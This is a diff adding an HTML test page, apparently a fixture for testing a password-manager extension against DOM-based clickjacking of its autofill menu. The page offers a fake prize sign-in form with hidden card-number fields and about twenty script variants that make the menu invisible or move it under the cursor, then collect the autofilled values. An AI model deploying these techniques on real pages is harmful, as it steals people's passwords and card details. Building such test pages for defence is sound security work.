@@ -1,0 +1,112 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Win a prize</title>
+    <style>
+      #lure { position: fixed; left: 0; top: 0; width: 100%; height: 100%; }
+      .decoy { font: 16px sans-serif; }
+    </style>
+  </head>
+  <body>
+    <h1 class="decoy">Sign in to claim your prize</h1>
+    <form id="f" action="/ext/welcome.html">
+      <label>Email <input id="user" name="email" autocomplete="username" /></label>
+      <label>Password <input id="pass" name="password" type="password" autocomplete="current-password" /></label>
+      <input id="hidden1" name="card" autocomplete="cc-number" style="display: none" />
+      <input id="offscreen" name="cardno" autocomplete="cc-number" style="position: absolute; left: -9000px" />
+      <input id="invisible" name="ccnumber" autocomplete="cc-number" style="opacity: 0" />
+      <button type="submit">Claim</button>
+    </form>
+    <script>
+      // Which attack to run comes from the URL. Every one tries to get a click on the
+      // extension's inline menu without the person seeing it, and then read the fields.
+      const attack = new URLSearchParams(location.search).get("attack");
+      const timing = new URLSearchParams(location.search).get("timing") || "after"; // before | after
+      window.__stolen = [];
+      setInterval(() => {
+        for (const id of ["user", "pass", "hidden1", "offscreen", "invisible"]) {
+          const v = document.getElementById(id).value;
+          if (v && !window.__stolen.includes(`${id}=${v}`)) window.__stolen.push(`${id}=${v}`);
+        }
+      }, 50);
+      window.__state = () => ({ user: document.getElementById("user").value, pass: document.getElementById("pass").value, stolen: window.__stolen });
+
+      const lastEl = () => document.documentElement.lastElementChild;
+      const isMenu = (el) => el && el !== document.body && el !== document.head && el.tagName === "DIV";
+      function find() {
+        return isMenu(lastEl()) ? lastEl() : null;
+      }
+      function overlay(style, popover) {
+        const d = document.createElement("div");
+        d.id = "overlay";
+        d.textContent = "Click anywhere to continue";
+        d.style.cssText = `position:fixed;inset:0;z-index:2147483647;background:#fff;${style}`;
+        if (popover) d.setAttribute("popover", "manual");
+        document.documentElement.appendChild(d);
+        if (popover) d.showPopover();
+        return d;
+      }
+      const attacks = {
+        // The published DOM-based variants.
+        "root-opacity": (m) => m && (m.style.setProperty("opacity", "0", "important")),
+        "root-opacity-tiny": (m) => m && (m.style.setProperty("opacity", "0.001", "important")),
+        "body-opacity": () => (document.body.style.opacity = "0.001"),
+        "html-opacity": () => (document.documentElement.style.opacity = "0"),
+        "html-opacity-tiny": () => (document.documentElement.style.opacity = "0.001"),
+        "overlay-partial": () => {
+          const d = overlay("clip-path:polygon(0 0,100% 0,100% 40%,0 40%);", false);
+          d.style.pointerEvents = "auto";
+        },
+        "overlay-full-pointer-none": () => overlay("pointer-events:none;", false),
+        "overlay-popover-pointer-none": () => overlay("pointer-events:none;", true),
+        "position-fixed-lure": (m) => m && ((m.style.setProperty("left", "0px", "important"), m.style.setProperty("top", "0px", "important"))),
+        "mouse-follow": (m) => document.addEventListener("mousemove", (e) => m && (m.style.setProperty("left", `${e.clientX - 10}px`, "important"), m.style.setProperty("top", `${e.clientY - 10}px`, "important"))),
+        // Other CSS with the same effect.
+        filter: () => (document.documentElement.style.filter = "opacity(0)"),
+        "root-filter": (m) => m && m.style.setProperty("filter", "opacity(0)", "important"),
+        clip: (m) => m && m.style.setProperty("clip-path", "inset(100%)", "important"),
+        mask: () => document.documentElement.style.setProperty("mask-image", "linear-gradient(transparent,transparent)"),
+        "transform-scale": (m) => m && m.style.setProperty("transform", "scale(0)", "important"),
+        "visibility-root": (m) => m && m.style.setProperty("visibility", "hidden", "important"),
+        "after-host": () => {
+          const d = document.createElement("div");
+          d.textContent = "x";
+          document.documentElement.appendChild(d);
+        },
+        "dialog-over": () => {
+          const dlg = document.createElement("dialog");
+          dlg.textContent = "Accept cookies?";
+          document.documentElement.appendChild(dlg);
+          dlg.showModal();
+        },
+      };
+      window.__runAttack = () => (attacks[attack] ?? (() => {}))(find());
+      // Before the menu exists, a page can only aim a stylesheet at where it will be.
+      const beforeCss = {
+        "root-opacity": "opacity:0 !important",
+        "root-opacity-tiny": "opacity:0.001 !important",
+        "position-fixed-lure": "left:0 !important;top:0 !important",
+        "root-filter": "filter:opacity(0) !important",
+        clip: "clip-path:inset(100%) !important",
+        "transform-scale": "transform:scale(0) !important",
+        "visibility-root": "visibility:hidden !important",
+      };
+      if (timing === "before" && attack) {
+        if (beforeCss[attack]) {
+          const s = document.createElement("style");
+          s.textContent = `html > div { ${beforeCss[attack]} }`;
+          document.head.appendChild(s);
+        } else window.__runAttack();
+      }
+      // A page can watch for the menu and strike as soon as it appears.
+      if (timing === "after" && attack) {
+        new MutationObserver(() => {
+          if (find() && !window.__struck) {
+            window.__struck = true;
+            setTimeout(window.__runAttack, 30);
+          }
+        }).observe(document.documentElement, { childList: true });
+      }
+    </script>
+  </body>
+</html>
